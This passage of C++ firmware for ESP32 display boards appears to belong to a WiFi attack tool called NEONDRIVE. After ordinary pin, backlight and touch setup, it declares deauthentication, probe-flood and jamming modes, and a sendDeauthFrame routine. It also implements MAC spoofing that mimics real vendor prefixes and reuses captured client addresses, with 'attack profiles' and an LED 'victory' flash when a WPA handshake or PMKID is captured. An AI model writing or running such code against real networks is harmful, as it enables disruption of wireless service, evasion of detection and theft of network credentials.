// Main firmware entry point and UI orchestration for the CYD target.
#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>
#include <TFT_eSPI.h>
#if defined(ARDUINO_LILYGO_T_DISPLAY_S3) || defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
#define NEONDRIVE_TARGET_BUTTON_NAV 1
#endif
#if defined(ARDUINO_LILYGO_T_DISPLAY_S3) && !defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
#define NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH 1
#endif
#if defined(NEONDRIVE_TARGET_T_EMBED_CC1101)
#define NEONDRIVE_TARGET_TEMBED 1
#endif

#if !defined(NEONDRIVE_TARGET_BUTTON_NAV)
#include <XPT2046_Touchscreen.h>
#endif
#include <LittleFS.h>
#include <SD.h>
using fs::File;
#include <FS.h>
#include <ArduinoJson.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Update.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <esp_heap_caps.h>

#include <ctype.h>
#include <math.h>
#include <stdarg.h>
#include <freertos/semphr.h>
#include "deauth_hunter.h"
#include "bruce_wifi.h"
#include "wpasec_client.h"
#include "yoink_engine.h"
#include "wsl_bypasser.h"
#include "app_config.h"
#include "config_store.h"
#include "wifi_connect_service.h"

/*
  NEONDRIVE // CYD — Milestone D
  - Home screen menu
  - Config screen with LittleFS-backed /config.json
  - LOCKED CYD BASELINE: init order + landscape + invertDisplay(true)
  - Touch mapping baked to PRESET #5 (invertX only) for landscape USB-right
  - Coexistence guardrail: Android companion is WiFi-only. BLE/BT control paths are
    intentionally disabled until explicit coexistence validation is completed on CYD.
*/

#if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
static constexpr bool BOARD_HAS_TOUCH = false;
static constexpr bool BOARD_HAS_SD = false;
static constexpr bool TFT_USES_SPI_BUS = false;
static constexpr int PIN_LCD_POWER_ON = 15;

// TFT is 8-bit parallel on this board, so SPI TFT pins are unused.
static constexpr int PIN_TFT_SCLK = -1;
static constexpr int PIN_TFT_MISO = -1;
static constexpr int PIN_TFT_MOSI = -1;
static constexpr int PIN_TFT_CS   = -1;

static constexpr int PIN_TOUCH_CS = -1;
static constexpr int PIN_TOUCH_SDA = 18;
static constexpr int PIN_TOUCH_SCL = 17;
static constexpr int PIN_TOUCH_INT = 16;
static constexpr int PIN_TOUCH_RST = 13;
static constexpr uint8_t TOUCH_ADDR_CST_SELF = 0x15;    // CST816/CST820 family
static constexpr uint8_t TOUCH_ADDR_CST_MUTUAL = 0x1A;  // CST328 family
static constexpr int PIN_SD_SCLK  = -1;
static constexpr int PIN_SD_MISO  = -1;
static constexpr int PIN_SD_MOSI  = -1;
static constexpr int PIN_SD_CS    = -1;
static constexpr int PIN_NAV_NEXT = BUTTON_1;
static constexpr int PIN_NAV_SELECT = BUTTON_2;
static constexpr int PIN_ENCODER_A = -1;
static constexpr int PIN_ENCODER_B = -1;

// T-Display-S3 has one TFT backlight pin.
static constexpr int BL_PINS[] = {38};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4};

// No discrete RGB status LED on T-Display-S3.
static constexpr int LED_PINS[] = {-1, -1, -1};
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};
#elif defined(NEONDRIVE_TARGET_TEMBED)
static constexpr bool BOARD_HAS_TOUCH = false;
static constexpr bool BOARD_HAS_SD = false;
static constexpr bool TFT_USES_SPI_BUS = true;
static constexpr int PIN_LCD_POWER_ON = -1;

static constexpr int PIN_TFT_SCLK = 40;
static constexpr int PIN_TFT_MISO = -1;
static constexpr int PIN_TFT_MOSI = 42;
static constexpr int PIN_TFT_CS   = 45;

static constexpr int PIN_TOUCH_CS = -1;
static constexpr int PIN_TOUCH_SDA = -1;
static constexpr int PIN_TOUCH_SCL = -1;
static constexpr int PIN_TOUCH_INT = -1;
static constexpr int PIN_TOUCH_RST = -1;
static constexpr uint8_t TOUCH_ADDR_CST_SELF = 0x00;
static constexpr uint8_t TOUCH_ADDR_CST_MUTUAL = 0x00;
static constexpr int PIN_SD_SCLK  = -1;
static constexpr int PIN_SD_MISO  = -1;
static constexpr int PIN_SD_MOSI  = -1;
static constexpr int PIN_SD_CS    = -1;
static constexpr int PIN_NAV_NEXT = 6;    // BOARD_USER_KEY
static constexpr int PIN_NAV_SELECT = 0;  // ENCODER_KEY
static constexpr int PIN_ENCODER_A = 1;
static constexpr int PIN_ENCODER_B = 2;

static constexpr int BL_PINS[] = {21};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4};

// No discrete RGB status LED on T-Embed.
static constexpr int LED_PINS[] = {-1, -1, -1};
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};
#else
static constexpr bool BOARD_HAS_TOUCH = true;
static constexpr bool BOARD_HAS_SD = true;
static constexpr bool TFT_USES_SPI_BUS = true;
static constexpr int PIN_LCD_POWER_ON = -1;

static constexpr int PIN_TFT_SCLK = 14;
static constexpr int PIN_TFT_MISO = 12;
static constexpr int PIN_TFT_MOSI = 13;
static constexpr int PIN_TFT_CS   = 15;

static constexpr int PIN_TOUCH_CS = TOUCH_CS; // from build_flags (-DTOUCH_CS=33)
static constexpr int PIN_SD_SCLK  = 18;
static constexpr int PIN_SD_MISO  = 19;
static constexpr int PIN_SD_MOSI  = 23;
static constexpr int PIN_SD_CS    = 5;
static constexpr int PIN_NAV_NEXT = -1;
static constexpr int PIN_NAV_SELECT = -1;
static constexpr int PIN_ENCODER_A = -1;
static constexpr int PIN_ENCODER_B = -1;

// CYD TFT backlight (variant-safe pins)
static constexpr int BL_PINS[] = {21, 27};
static constexpr uint8_t BL_PWM_CHANNELS[] = {4, 5};

// CYD onboard RGB LED (active-low)
static constexpr int LED_PINS[] = {4, 16, 17};  // R, G, B
static constexpr uint8_t LED_PWM_CHANNELS[] = {0, 1, 2};
#endif
static bool backlightPwmReady = false;
static uint8_t backlightLevel = 255;  // Always full LCD backlight on boot

static bool statusLedPwmReady = false;

// Touch raw ranges (no calibration defaults)
static constexpr int RAW_X_MIN = 250;
static constexpr int RAW_X_MAX = 3850;
static constexpr int RAW_Y_MIN = 250;
static constexpr int RAW_Y_MAX = 3850;

TFT_eSPI tft;
#if !defined(NEONDRIVE_TARGET_BUTTON_NAV)
XPT2046_Touchscreen ts(PIN_TOUCH_CS);
#endif
static uint32_t g_touchDebounceUntilMs = 0;

// ---------- Utilities ----------
static int clampi(int v, int lo, int hi) {
  if (v < lo) return lo;
  if (v > hi) return hi;
  return v;
}

static int mapRawToRange(int raw, int rawMin, int rawMax, int outMaxExclusive) {
  raw = clampi(raw, rawMin, rawMax);
  long num = (long)(raw - rawMin) * (long)(outMaxExclusive - 1);
  long den = (long)(rawMax - rawMin);
  if (den <= 0) den = 1;
  return (int)(num / den);
}

static uint32_t hashText(const char* s) {
  uint32_t h = 2166136261u;
  if (!s) return h;
  while (*s) {
    h ^= (uint8_t)(*s++);
    h *= 16777619u;
  }
  return h;
}

static void backlightBringup() {
  if (PIN_LCD_POWER_ON >= 0) {
    pinMode(PIN_LCD_POWER_ON, OUTPUT);
    digitalWrite(PIN_LCD_POWER_ON, HIGH);
  }

  for (int pin : BL_PINS) {
    if (pin < 0) continue;
    pinMode(pin, OUTPUT);
    digitalWrite(pin, HIGH);
  }

#if !defined(NEONDRIVE_TARGET_BUTTON_NAV)
  // Quick blink test (2 blinks)
  for (int i = 0; i < 2; i++) {
    for (int pin : BL_PINS) {
      if (pin < 0) continue;
      digitalWrite(pin, LOW);
    }
    delay(120);
    for (int pin : BL_PINS) {
      if (pin < 0) continue;
      digitalWrite(pin, HIGH);
    }
    delay(120);
  }
#endif
}

static void initBacklightPwmIfNeeded() {
  if (backlightPwmReady) return;
  for (size_t i = 0; i < sizeof(BL_PINS) / sizeof(BL_PINS[0]); i++) {
    if (BL_PINS[i] < 0) continue;
    ledcSetup(BL_PWM_CHANNELS[i], 5000, 8);  // 8-bit brightness
    ledcAttachPin(BL_PINS[i], BL_PWM_CHANNELS[i]);
  }
  backlightPwmReady = true;
}

static void applyBacklightLevel(uint8_t level) {
  backlightLevel = level;
  initBacklightPwmIfNeeded();
  for (size_t i = 0; i < sizeof(BL_PINS) / sizeof(BL_PINS[0]); i++) {
    if (BL_PINS[i] < 0) continue;
    ledcWrite(BL_PWM_CHANNELS[i], backlightLevel);
  }
}

static void initStatusLedPwmIfNeeded() {
  if (LED_PINS[0] < 0) return;
  if (statusLedPwmReady) return;
  for (size_t i = 0; i < sizeof(LED_PINS) / sizeof(LED_PINS[0]); i++) {
    if (LED_PINS[i] < 0) continue;
    pinMode(LED_PINS[i], OUTPUT);
    ledcSetup(LED_PWM_CHANNELS[i], 5000, 8);
    ledcAttachPin(LED_PINS[i], LED_PWM_CHANNELS[i]);
  }
  statusLedPwmReady = true;
}

static void applyStatusLedState(uint8_t brightness, uint8_t red, uint8_t green, uint8_t blue) {
  if (LED_PINS[0] < 0) return;
  initStatusLedPwmIfNeeded();

  const uint8_t r = (uint8_t)(((uint16_t)red * (uint16_t)brightness) / 255);
  const uint8_t g = (uint8_t)(((uint16_t)green * (uint16_t)brightness) / 255);
  const uint8_t b = (uint8_t)(((uint16_t)blue * (uint16_t)brightness) / 255);

  // Active-low LED: 0=full ON, 255=OFF
  ledcWrite(LED_PWM_CHANNELS[0], 255 - r);
  ledcWrite(LED_PWM_CHANNELS[1], 255 - g);
  ledcWrite(LED_PWM_CHANNELS[2], 255 - b);
}

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static void tdisplayNavBuild();
static void tdisplayNavDrawHeaderStatus();
static void tdisplayNavDrawSelectedOutline();
static bool tdisplayNavConsumeRefreshRequest();
static void tdisplayRedrawCurrentScreen();
#endif

static void drawBorder() {
  const int w = tft.width();
  const int h = tft.height();
  tft.drawRect(0, 0, w, h, TFT_DARKGREY);
#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  tdisplayNavBuild();
  tdisplayNavDrawHeaderStatus();
  tdisplayNavDrawSelectedOutline();
#endif
}

// ---------- Touch (baked PRESET #5) ----------

struct TouchState {
  bool down;
  int x;
  int y;
  int z;
  int rx;
  int ry;
};

static int g_lastTouchRawX = -1;
static int g_lastTouchRawY = -1;
static int g_lastTouchRawZ = 0;

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static bool tdisplayHandleButtonInput(int& outX, int& outY);
#endif

#if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
enum class TDisplayTouchController : uint8_t {
  NONE = 0,
  CST_SELF = 1,
  CST_MUTUAL = 2,
};

static TDisplayTouchController g_tdisplayTouchController = TDisplayTouchController::NONE;
static bool g_tdisplayTouchPresent = false;
static uint8_t g_tdisplayTouchAddr = 0;
static bool g_tdisplayTouchAxesLocked = false;
static bool g_tdisplayTouchLandscapeCoords = false;

static bool tdisplayI2cProbe(uint8_t addr) {
  Wire.beginTransmission(addr);
  return (Wire.endTransmission() == 0);
}

static bool tdisplayI2cRead8(uint8_t addr, uint8_t reg, uint8_t* out, size_t len) {
  if (!out || len == 0) return false;
  Wire.beginTransmission(addr);
  Wire.write(reg);
  if (Wire.endTransmission(false) != 0) return false;
  size_t got = Wire.requestFrom((int)addr, (int)len);
  if (got != len) return false;
  for (size_t i = 0; i < len; i++) out[i] = Wire.read();
  return true;
}

static bool tdisplayI2cRead16(uint8_t addr, uint16_t reg, uint8_t* out, size_t len) {
  if (!out || len == 0) return false;
  Wire.beginTransmission(addr);
  Wire.write((uint8_t)(reg >> 8));
  Wire.write((uint8_t)(reg & 0xFF));
  if (Wire.endTransmission(false) != 0) return false;
  size_t got = Wire.requestFrom((int)addr, (int)len);
  if (got != len) return false;
  for (size_t i = 0; i < len; i++) out[i] = Wire.read();
  return true;
}

static bool tdisplayReadTouchRaw(int& outRawX, int& outRawY, int& outZ) {
  outRawX = -1;
  outRawY = -1;
  outZ = 0;

  if (!g_tdisplayTouchPresent) return false;

  if (g_tdisplayTouchController == TDisplayTouchController::CST_SELF) {
    uint8_t data[5] = {0};
    if (!tdisplayI2cRead8(g_tdisplayTouchAddr, 0x02, data, sizeof(data))) return false;
    const uint8_t points = data[0] & 0x0F;
    if (points == 0) return false;
    outRawX = ((int)(data[1] & 0x0F) << 8) | data[2];
    outRawY = ((int)(data[3] & 0x0F) << 8) | data[4];
    outZ = points;
    return true;
  }

  if (g_tdisplayTouchController == TDisplayTouchController::CST_MUTUAL) {
    uint8_t data[6] = {0};
    if (!tdisplayI2cRead16(g_tdisplayTouchAddr, 0xD000, data, sizeof(data))) return false;
    uint8_t points = data[5] & 0x0F;
    if (points == 0) points = data[0] & 0x0F;
    if (points == 0) return false;
    outRawX = ((int)data[1] << 4) | ((data[3] >> 4) & 0x0F);
    outRawY = ((int)data[2] << 4) | (data[3] & 0x0F);
    outZ = points;
    return true;
  }

  return false;
}

static void tdisplayMapTouchToScreen(int rawX, int rawY, int& outX, int& outY) {
  const int w = tft.width();
  const int h = tft.height();

  // First touch determines whether controller is reporting portrait or landscape axes.
  if (!g_tdisplayTouchAxesLocked) {
    // If X exceeds screen height, we are almost certainly already in landscape coords.
    // If Y exceeds screen height, controller is in portrait coords.
    if (rawX > h) {
      g_tdisplayTouchLandscapeCoords = true;
      g_tdisplayTouchAxesLocked = true;
      Serial.println("[touch] axis mode: landscape");
    } else if (rawY > h) {
      g_tdisplayTouchLandscapeCoords = false;
      g_tdisplayTouchAxesLocked = true;
      Serial.println("[touch] axis mode: portrait");
    }
  }

  if (g_tdisplayTouchLandscapeCoords) {
    outX = clampi(rawX, 0, w - 1);
    outY = clampi(rawY, 0, h - 1);
    return;
  }

  // Default for T-Display-S3 touch modules: portrait touch axes with TFT rotation(1).
  outX = clampi(rawY, 0, w - 1);
  outY = clampi((h - 1) - rawX, 0, h - 1);
}

static void tdisplayTouchResetPulse() {
  pinMode(PIN_TOUCH_RST, OUTPUT);
  digitalWrite(PIN_TOUCH_RST, HIGH);
  delay(2);
  digitalWrite(PIN_TOUCH_RST, LOW);
  delay(12);
  digitalWrite(PIN_TOUCH_RST, HIGH);
  delay(60);
}

static bool tdisplayTouchInit() {
  Wire.begin(PIN_TOUCH_SDA, PIN_TOUCH_SCL);
  Wire.setClock(400000);
  pinMode(PIN_TOUCH_INT, INPUT_PULLUP);
  tdisplayTouchResetPulse();

  g_tdisplayTouchPresent = false;
  g_tdisplayTouchController = TDisplayTouchController::NONE;
  g_tdisplayTouchAddr = 0;
  g_tdisplayTouchAxesLocked = false;
  g_tdisplayTouchLandscapeCoords = false;

  if (tdisplayI2cProbe(TOUCH_ADDR_CST_SELF)) {
    g_tdisplayTouchPresent = true;
    g_tdisplayTouchController = TDisplayTouchController::CST_SELF;
    g_tdisplayTouchAddr = TOUCH_ADDR_CST_SELF;
  } else if (tdisplayI2cProbe(TOUCH_ADDR_CST_MUTUAL)) {
    g_tdisplayTouchPresent = true;
    g_tdisplayTouchController = TDisplayTouchController::CST_MUTUAL;
    g_tdisplayTouchAddr = TOUCH_ADDR_CST_MUTUAL;
  }

  if (!g_tdisplayTouchPresent) return false;

  const char* ctrl =
      (g_tdisplayTouchController == TDisplayTouchController::CST_SELF) ? "CST_SELF"
      : (g_tdisplayTouchController == TDisplayTouchController::CST_MUTUAL) ? "CST_MUTUAL"
                                                                            : "UNKNOWN";
  Serial.printf("[touch] detected controller=%s addr=0x%02X (SDA=%d SCL=%d INT=%d RST=%d)\n",
                ctrl, g_tdisplayTouchAddr, PIN_TOUCH_SDA, PIN_TOUCH_SCL, PIN_TOUCH_INT, PIN_TOUCH_RST);
  return true;
}
#endif

static TouchState readTouch() {
  TouchState s{};
  s.down = false;

#if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  int rx = -1;
  int ry = -1;
  int rz = 0;
  if (!tdisplayReadTouchRaw(rx, ry, rz)) {
    return s;
  }

  int mappedX = 0;
  int mappedY = 0;
  tdisplayMapTouchToScreen(rx, ry, mappedX, mappedY);

  s.rx = rx;
  s.ry = ry;
  s.z = rz;
  s.x = mappedX;
  s.y = mappedY;
  s.down = true;

  g_lastTouchRawX = s.rx;
  g_lastTouchRawY = s.ry;
  g_lastTouchRawZ = s.z;
  return s;
#elif defined(NEONDRIVE_TARGET_TEMBED)
  // T-Embed uses encoder/buttons only; no touch controller.
  return s;
#else
  // NOTE: On some CYD/XPT2046 boards, ts.touched() can get "stuck true" after redraws.
  // We avoid that by always sampling getPoint() and using pressure (z) as truth.
  TS_Point p = ts.getPoint();
  s.rx = p.x;
  s.ry = p.y;
  s.z  = p.z;
  g_lastTouchRawX = s.rx;
  g_lastTouchRawY = s.ry;
  g_lastTouchRawZ = s.z;

  // Pressure gate: treat low pressure as NOT pressed (prevents stuck-touch deadlocks).
  // Tuneable threshold:
  if (s.z <= 80) {
    s.down = false;
    return s;
  }

  // Map raw to screen-space
  int mx = mapRawToRange(s.rx, RAW_X_MIN, RAW_X_MAX, tft.width());
  int my = mapRawToRange(s.ry, RAW_Y_MIN, RAW_Y_MAX, tft.height());

  // PRESET #5: swapXY=false, invertX=true, invertY=false
  mx = (tft.width() - 1) - mx;

  s.x = clampi(mx, 0, tft.width() - 1);
  s.y = clampi(my, 0, tft.height() - 1);

  s.down = true;
  return s;
#endif
}

static bool touchEdgeTriggered(int &outX, int &outY) {
  static bool wasDown = false;
  if (millis() < g_touchDebounceUntilMs) return false;

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  TouchState s = readTouch();

  if (s.down && !wasDown) {
    wasDown = true;
    outX = s.x;
    outY = s.y;
    return true;
  }
  if (!s.down) wasDown = false;

  // Hardware buttons remain available as NEXT/SELECT fallback.
  return tdisplayHandleButtonInput(outX, outY);
#else
  TouchState s = readTouch();

  if (s.down && !wasDown) {
    wasDown = true;
    outX = s.x;
    outY = s.y;
    return true;
  }
  if (!s.down) wasDown = false;
  return false;
#endif
}

static void resetTouchLatch() {
}

static void waitTouchRelease() {
  // Non-blocking debounce: avoid frame stalls from delay().
  g_touchDebounceUntilMs = millis() + 40;
  resetTouchLatch();
}


// ---------- Config ----------
static AppConfig cfg;
static bool configDirty = false;

static void saveWifiCredential(const String& ssid, const String& password) {
  wifiSaveCredential(cfg, ssid, password);
}

// ---------- Telemetry API Buffers ----------
struct ConsoleEvent {
  uint32_t seq;
  uint32_t ms;
  char level[6];
  char tag[12];
  char msg[120];
};

struct PacketEvent {
  uint32_t seq;
  uint32_t ms;
  int16_t rssi;
  uint16_t len;
  uint8_t type;
  uint8_t subtype;
  uint8_t channel;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
};

static constexpr uint16_t CONSOLE_RING_SIZE = 32;   // Reduced from 220 to save DRAM for LED feature
static constexpr uint16_t PACKET_RING_SIZE = 32;    // Reduced from 278 to save DRAM for LED feature
static ConsoleEvent consoleRing[CONSOLE_RING_SIZE];
static PacketEvent packetRing[PACKET_RING_SIZE];
static volatile uint32_t consoleSeq = 0;
static volatile uint16_t consoleHead = 0;
static volatile uint32_t packetSeq = 0;
static volatile uint16_t packetHead = 0;
static portMUX_TYPE packetRingMux = portMUX_INITIALIZER_UNLOCKED;

static void pushConsoleEvent(const char* level, const char* tag, const char* msg) {
  if (!msg) return;
  uint16_t idx = consoleHead;
  consoleRing[idx].seq = ++consoleSeq;
  consoleRing[idx].ms = millis();
  strncpy(consoleRing[idx].level, level ? level : "INFO", sizeof(consoleRing[idx].level) - 1);
  consoleRing[idx].level[sizeof(consoleRing[idx].level) - 1] = '\0';
  strncpy(consoleRing[idx].tag, tag ? tag : "SYS", sizeof(consoleRing[idx].tag) - 1);
  consoleRing[idx].tag[sizeof(consoleRing[idx].tag) - 1] = '\0';
  strncpy(consoleRing[idx].msg, msg, sizeof(consoleRing[idx].msg) - 1);
  consoleRing[idx].msg[sizeof(consoleRing[idx].msg) - 1] = '\0';
  consoleHead = (uint16_t)((consoleHead + 1) % CONSOLE_RING_SIZE);
}

static void pushConsoleEventf(const char* level, const char* tag, const char* fmt, ...) {
  char buf[120];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  pushConsoleEvent(level, tag, buf);
}

static void macToStr(const uint8_t mac[6], char out[18]) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ---------- YOINK Log Callback ----------
// Routes YOINK engine log messages into the main console ring
// so the companion app (polling /api/console) and monitor screen see them.
static void yoinkLogCallback(const char* msg) {
  pushConsoleEvent("INFO", "YOINK", msg);
}


// ---------- WiFi Scan Data (Milestone C) ----------

#include "ap_record.h"

#include "wifiscan_helpers.h"

// Diagnostic/fallback controls
#define JAMMIT_PROMISCUOUS_TEST 1

// Global mutex used to serialize Wi-Fi driver calls.  Declared early so helpers
// such as tryAlternateTx() and sniff startup/teardown can reference it.
static SemaphoreHandle_t wifiOpMutex = NULL;

// Forward declarations for functions that are implemented later in the file but
// are referenced from earlier code (startSniff, the test deauth, and auto-mode
// ticks).
static bool macFromString(const char* str, uint8_t* mac);
static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason);
static String normalizeSdWebPath(String path);
static void startAPMode();
static void uiMemLog(const char* tag);
static void uiMemBudgetBoot();

// AutoMode must be declared before handleCapturedPacket so the promiscuous
// callback can filter on JAMMIT mode without a forward-declaration problem.
enum class AutoMode : uint8_t { NONE, Y0INK, RAW, SCOPE, JAMMIT, PROBE_FLOOD, DEAUTH_FLOOD };
static AutoMode autoMode = AutoMode::NONE;
static void engageAutoMode(AutoMode mode);
static void disengageAutoMode();
static void exportThreatDataToSD();  // Forward declaration for threat export

// ============================================================================
// MAC SPOOFING ENGINE - Vendor OUI + MAC Pool + Per-Frame Rotation  
// ============================================================================
enum class SpoofMode : uint8_t {
  STANDARD = 0,      // Normal randomization (existing)
  MAC_POOL = 1,      // Rotate through discovered client MACs
  VENDOR_OUI = 2,    // Spoof real vendor OUIs (Apple, Samsung, etc.)
  HYBRID = 3         // MAC_POOL + rotate OUI prefixes
};

static SpoofMode activeSpoofMode = SpoofMode::STANDARD;

// Real vendor OUI prefixes (Apple, Samsung, Google, Intel, etc.)
static const uint8_t VENDOR_OUIS[][3] = {
  {0x00, 0x1A, 0xA0},  // Apple
  {0x00, 0x25, 0x86},  // Apple
  {0xA4, 0x77, 0x1F},  // Samsung
  {0x5C, 0xF3, 0x70},  // Samsung
  {0x48, 0xA4, 0x72},  // Google Pixel
  {0x64, 0x16, 0x66},  // Intel
  {0x7C, 0x2F, 0x80},  // Dell
  {0x08, 0x00, 0x27},  // Virtualbox
  {0x52, 0x54, 0x00},  // QEMU
  {0x08, 0x11, 0x96},  // Cisco
  {0x00, 0x0F, 0xE2},  // Netgear
  {0x6C, 0x2B, 0x59},  // Huawei
  {0xB0, 0xBF, 0xB5},  // LG
  {0xE0, 0xFC, 0xBC},  // Sony
  {0x1C, 0x1A, 0x80},  // Linksys
  {0xAA, 0xBB, 0xCC},  // Generic fallback
};
#define VENDOR_OUI_COUNT 16

// MAC pool: discovered client MACs (circular buffer in DRAM, rest offloaded to SD)
#define MAC_POOL_SIZE 1  // Ultra-minimal for DRAM (1 entry only)
static uint8_t macPoolBuffer[MAC_POOL_SIZE][6];
static uint8_t macPoolCount = 0;
static uint8_t macPoolIndex = 0;
static uint32_t lastMacPoolRotateMs = 0;

// Observed MAC history for analysis (stored on SD, loaded on demand)
static const char* MAC_POOL_SD_PATH = "/captures/mac_pool.csv";

// Add discovered MAC to pool if not already present
static void addMacToPool(const uint8_t mac[6]) {
  if (!mac) return;
  for (int i = 0; i < macPoolCount; i++) {
    if (memcmp(macPoolBuffer[i], mac, 6) == 0) return;
  }
  if (macPoolCount < MAC_POOL_SIZE) {
    memcpy(macPoolBuffer[macPoolCount++], mac, 6);
    Serial.printf("[SPOOF] Added MAC to pool: %02X:%02X:%02X:%02X:%02X:%02X (total=%d)\n",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], macPoolCount);
  } else {
    memcpy(macPoolBuffer[macPoolIndex % MAC_POOL_SIZE], mac, 6);
    macPoolIndex++;
  }
}

static const uint8_t* getNextPooledMAC() {
  if (macPoolCount == 0) return nullptr;
  const uint8_t* mac = macPoolBuffer[macPoolIndex % macPoolCount];
  macPoolIndex++;
  return mac;
}

static void spoofMACWithVendorOUI(uint8_t out[6]) {
  uint8_t ouiIdx = random(0, VENDOR_OUI_COUNT);
  memcpy(out, VENDOR_OUIS[ouiIdx], 3);
  out[3] = random(0x00, 0xFF);
  out[4] = random(0x00, 0xFF);
  out[5] = random(0x00, 0xFF);
  out[0] |= 0x02;
  out[0] &= 0xFE;
}

static void spoofMACFromPool(uint8_t out[6]) {
  const uint8_t* pooled = getNextPooledMAC();
  if (pooled) {
    memcpy(out, pooled, 6);
  } else {
    for (int i = 0; i < 6; i++) out[i] = random(0x00, 0xFF);
    out[0] |= 0x02;
    out[0] &= 0xFE;
  }
}

static void spoofMACHybrid(uint8_t out[6]) {
  static uint8_t lastOuiIdx = 0;
  if ((macPoolIndex % 10) == 0) {
    lastOuiIdx = random(0, VENDOR_OUI_COUNT);
  }
  memcpy(out, VENDOR_OUIS[lastOuiIdx], 3);
  out[3] = random(0x00, 0xFF);
  out[4] = random(0x00, 0xFF);
  out[5] = random(0x00, 0xFF);
  out[0] |= 0x02;
  out[0] &= 0xFE;
}

static void applyActiveSpoofMode(uint8_t mac[6]) {
  switch (activeSpoofMode) {
    case SpoofMode::MAC_POOL:
      spoofMACFromPool(mac);
      break;
    case SpoofMode::VENDOR_OUI:
      spoofMACWithVendorOUI(mac);
      break;
    case SpoofMode::HYBRID:
      spoofMACHybrid(mac);
      break;
    case SpoofMode::STANDARD:
    default:
      for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF);
      mac[0] |= 0x02;
      mac[0] &= 0xFE;
  }
  
  // Log spoofed MAC (sample every 50 frames to avoid spam)
  static uint8_t logCounter = 0;
  if (++logCounter >= 50) {
    logCounter = 0;
    Serial.printf("[SPOOF] MAC: %02X:%02X:%02X:%02X:%02X:%02X Mode=%d\n",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                  (uint8_t)activeSpoofMode);
  }
}

static void exportMacPoolToSD() {
  // Stub - will be implemented when sdReady is available
  // For now, just log that it was called
  Serial.printf("[SPOOF] exportMacPoolToSD called (stub)\n");
}

static void loadMacPoolFromSD() {
  // Stub - will be implemented when sdReady is available
  Serial.printf("[SPOOF] loadMacPoolFromSD called (stub)\n");
}

// JustGo Attack Profiles (expert pentest modes)
enum class JustGoProfile : uint8_t { STANDARD = 0, STEALTH = 1, PROBE_FIRST = 2, CHAOS = 3 };
static const char* profileNames[] = { "STANDARD", "STEALTH", "PROBE_FIRST", "CHAOS" };
static JustGoProfile justGoProfile = JustGoProfile::STANDARD;

// MAC Spoofing mode for Just Go attacks
static const char* spoofModeNames[] = { "STANDARD", "MAC_POOL", "VENDOR_OUI", "HYBRID" };
static SpoofMode justGoSpoofMode = SpoofMode::STANDARD;  // Can be switched per run

// LED victory flash system (for handshakes/wins)
#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
#define LED_PIN -1
#else
#define LED_PIN 21
#endif
static uint32_t ledFlashEndTime = 0;
static bool ledFlashing = false;

// Flash LED for N seconds when winning (handshake/PMKID capture)
static void flashLEDForVictory(uint32_t durationSeconds = 10) {
  if (LED_PIN < 0) return;
  // Start flashing green for victory
  ledFlashEndTime = millis() + (durationSeconds * 1000);
  ledFlashing = true;
  Serial.printf("[LED] Victory flash enabled for %us (pin %d)\n", durationSeconds, LED_PIN);
}

// Public wrapper for external modules to trigger LED victory
extern "C" void triggerLEDVictoryFlash() {
  flashLEDForVictory(10);  // Flash for 10 seconds
}

// Update LED flash state (call from loop)
static void updateLEDFlash() {
  if (LED_PIN < 0) return;
  if (!ledFlashing) return;
  
  uint32_t now = millis();
  if (now >= ledFlashEndTime) {
    // Flash complete - turn off LED
    ledFlashing = false;
    neopixelWrite(LED_PIN, 0, 0, 0);  // Off
    Serial.printf("[LED] Victory flash complete\n");
    return;
  }
  
  // Flash pattern: fast blink (200ms on/off)
  uint32_t elapsed = now % 400;
  if (elapsed < 200) {
    // ON: bright green for victory
    neopixelWrite(LED_PIN, 0, 255, 0);  // Green
  } else {
    // OFF: very dim green
    neopixelWrite(LED_PIN, 0, 30, 0);  // Dim green
  }
}

// Map profile to spoofing mode and update active mode
static void updateSpoofModeFromProfile() {
  SpoofMode newMode = SpoofMode::STANDARD;
  
  switch (justGoProfile) {
    case JustGoProfile::STEALTH:
      // STEALTH: Passive only, minimal spoofing
      newMode = SpoofMode::STANDARD;  // Basic random MAC
      break;
    case JustGoProfile::PROBE_FIRST:
      // PROBE_FIRST: Advanced technique, use vendor OUI spoofing
      newMode = SpoofMode::VENDOR_OUI;
      break;
    case JustGoProfile::CHAOS:
      // CHAOS: Aggressive, rotate through discovered MACs
      newMode = SpoofMode::MAC_POOL;
      break;
    default:  // STANDARD
      // STANDARD: Hybrid approach for balanced technique
      newMode = SpoofMode::HYBRID;
      break;
  }
  
  if (newMode != justGoSpoofMode) {
    justGoSpoofMode = newMode;
    activeSpoofMode = newMode;
    
    Serial.printf("[PROFILE] Profile changed to %s -> Spoof mode: %s\n",
                  profileNames[(uint8_t)justGoProfile],
                  spoofModeNames[(uint8_t)justGoSpoofMode]);
  }
}

// Forward declarations for spoofing functions (defined later in file)
static void addMacToPool(const uint8_t mac[6]);
static void applyActiveSpoofMode(uint8_t mac[6]);
static void exportMacPoolToSD();
static void loadMacPoolFromSD();

// ============================================================================
// THREAT ASSESSMENT ENGINE - Real-time target threat scoring for Android analysis
// ============================================================================

struct ThreatAssessment {
